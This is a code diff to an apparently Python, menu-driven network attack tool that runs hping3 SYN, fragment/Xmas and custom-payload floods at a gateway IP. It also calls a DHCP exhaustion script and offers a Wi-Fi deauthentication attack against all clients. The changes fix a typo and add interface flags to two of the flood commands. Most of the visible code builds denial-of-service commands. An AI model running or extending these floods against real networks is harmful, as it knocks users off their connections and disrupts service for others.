@@ -94,7 +94,7 @@ def show_menu():
     print("4. Fragment/Xmas Attack")
     print("5. Custom Data SYN Attack")
     print("6. DHCP Exhaustion Attack")
-    print("7. Deauthenthication Attack(ALL CLIENTS)")
+    print("7. Deauthentication Attack (ALL CLIENTS)")
     print("8. Exit")
  
 def run_hping3(option, gateway_ip=None, iface="wlan0"):
@@ -105,9 +105,9 @@ def run_hping3(option, gateway_ip=None, iface="wlan0"):
     elif option == "3":
         cmd = ["hping3", "-2", "-S", "-i", iface, "--flood", "-p", "53", f"{gateway_ip}"]
     elif option == "4":
-        cmd = ["hping3", "-F", "-x", "--flood", f"{gateway_ip}", "-p", "80"]
+        cmd = ["hping3", "-F", "-x", "-i", iface, "--flood", f"{gateway_ip}", "-p", "80"]
     elif option == "5":
-        cmd = ["hping3", "-S", "--flood", "--data", "X"*1024, f"{gateway_ip}", "-p", "80"]
+        cmd = ["hping3", "-S", "--flood", "-i", iface, "--data", "X"*1024, f"{gateway_ip}", "-p", "80"]
     elif option == "6":
         cmd = ["python3", str(Path(__file__).parent / "dhcp_exhaust.py"), "-i", iface]
     elif option == "7":
@@ -152,7 +152,6 @@ def run_hping3(option, gateway_ip=None, iface="wlan0"):
                     capture_output=True,
                     text=True
                 )
-                elapsed = time.time() - start_time
                 stats['total_pings'] += 1
                 
                 if ping_result.returncode == 0:
